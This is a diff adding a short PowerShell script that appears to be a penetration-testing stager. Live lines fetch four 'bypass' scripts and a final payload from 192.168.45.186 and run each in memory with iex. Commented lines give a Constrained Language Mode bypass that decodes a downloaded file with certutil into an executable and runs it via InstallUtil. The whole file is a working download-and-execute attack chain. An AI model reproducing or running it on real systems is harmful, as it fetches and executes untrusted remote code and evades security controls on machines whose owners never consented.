@@ -1,0 +1,23 @@
+# If CLM bypass is needed:
+# iwr -usebasicparsing -uri http://192.168.45.186/se1el1em.txt -outfile C:\Windows\Tasks\si1el1em.txt
+# sleep 2
+# c:\windows\system32\certutil.exe -decode C:\Windows\Tasks\si1el1em.txt C:\Windows\Tasks\si1el.exe
+# sleep 2
+# & "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /logfile= /LogToConsole=false /U C:\Windows\Tasks\si1el.exe
+# sleep 3
+
+
+(iwr -usebasicparsing -uri http://192.168.45.186/bypass/1.txt).Content | iex
+Start-Sleep 2
+echo 1
+(iwr -usebasicparsing -uri http://192.168.45.186/bypass/2.txt).Content | iex
+Start-Sleep 2
+echo 2
+(iwr -usebasicparsing -uri http://192.168.45.186/bypass/3.txt).Content | iex
+Start-Sleep 5
+echo 3
+(iwr -usebasicparsing -uri http://192.168.45.186/bypass/4.txt).Content | iex
+Start-Sleep 5
+echo 4
+(iwr -usebasicparsing -uri http://192.168.45.186/run.txt).Content | iex
+echo Done
